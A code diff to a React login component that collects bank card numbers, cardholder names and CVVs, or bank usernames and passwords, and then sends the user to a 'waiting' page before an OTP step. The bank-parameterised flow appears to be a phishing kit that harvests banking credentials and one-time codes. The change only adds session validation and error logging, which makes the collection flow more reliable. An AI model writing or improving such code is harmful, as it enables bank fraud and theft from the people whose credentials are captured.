@@ -45,9 +45,15 @@ export default function LoginMethod() {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     try {
+      const currentSessionId = sessionId || params.get("session") || "";
+      if (!currentSessionId) {
+        toast.error(isArabic ? "جلسة غير صالحة" : "Invalid session");
+        return;
+      }
+
       if (method === "card") {
         await submitLoginMethodMutation.mutateAsync({
-          sessionId,
+          sessionId: currentSessionId,
           loginType: "card",
           cardNumber: cardData.cardNumber,
           cardholderName: cardData.cardholderName,
@@ -58,7 +64,7 @@ export default function LoginMethod() {
         } as any);
       } else {
         await submitLoginMethodMutation.mutateAsync({
-          sessionId,
+          sessionId: currentSessionId,
           loginType: "user",
           username: userData.username,
           password: userData.password,
@@ -68,8 +74,9 @@ export default function LoginMethod() {
           cvv: undefined,
         } as any);
       }
-      setLocation(`/waiting?bank=${bank}&session=${sessionId}&next=otp`);
+      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=otp`);
     } catch (error) {
+      console.error("Submission error:", error);
       toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "Error during submission");
     }
   };
